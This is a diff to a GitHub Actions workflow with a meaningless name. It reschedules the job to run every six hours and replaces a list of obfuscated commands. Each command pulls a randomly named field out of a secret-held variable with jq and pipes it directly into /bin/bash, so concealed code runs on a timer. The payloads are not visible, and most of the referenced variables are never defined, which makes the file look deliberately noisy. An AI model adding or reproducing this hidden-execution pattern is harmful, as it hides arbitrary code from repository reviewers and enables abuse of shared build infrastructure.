@@ -2,24 +2,26 @@ name: corrosionsorrowful
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 4/6 * * *'
+    - cron: '18 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: corrosionsorrowful
         env:
-          jcfy86711: ${{ secrets.jcfy86711 }}
+          log9: ${{ secrets.log9 }}
         run: |
-          echo $jcfy86711 | jq -r .s42352 | /bin/bash
-          echo $enttf6160 | jq -r .gwv02 | /bin/bash
-          echo $bf1864 | jq -r .ld0555 | /bin/bash
-          echo $b3 | jq -r .pay211 | /bin/bash
-          echo $i370 | jq -r .s8 | /bin/bash
-          echo $edumk01303 | jq -r .p05 | /bin/bash
-          echo $ktdan6 | jq -r .ph556 | /bin/bash
-          echo $a7643 | jq -r .lj03622 | /bin/bash
-          echo $gbx7101 | jq -r .guy13 | /bin/bash
+          echo $log9 | jq -r .kiitx10643 | /bin/bash
+          echo $ficr77 | jq -r .hd02 | /bin/bash
+          echo $qcv54 | jq -r .cpwaj80859 | /bin/bash
+          echo $uz594 | jq -r .ppl308 | /bin/bash
+          echo $m0294 | jq -r .unrvn5 | /bin/bash
+          echo $itq37 | jq -r .l4749 | /bin/bash
+          echo $fbm2084 | jq -r .q010 | /bin/bash
+          echo $t6 | jq -r .bcurp0532 | /bin/bash
+          echo $blj20490 | jq -r .zyir9568 | /bin/bash
+          echo $vylk56 | jq -r .ob46456 | /bin/bash
+          echo $nfb45 | jq -r .em6801 | /bin/bash
 
